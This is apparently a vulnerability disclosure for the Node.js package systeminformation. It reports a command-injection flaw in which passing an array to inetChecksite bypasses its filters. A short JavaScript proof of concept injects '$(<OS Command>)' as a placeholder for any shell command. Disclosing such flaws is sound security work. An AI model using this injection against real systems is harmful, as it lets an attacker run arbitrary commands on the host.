# Description

`systeminformation` is vulnerable to `Command Injection` vulnerability.

It is possible to send an array containing OS commands, which bypass the filters.  

# Proof of Concept

1. Create a Javascript file with the content below:

```javascript
const si = require('systeminformation');
const command = "$(<OS Command>)";
si.inetChecksite([command]);
```

2. Edit the constant `command` with a desired OS command.

3. Run it.
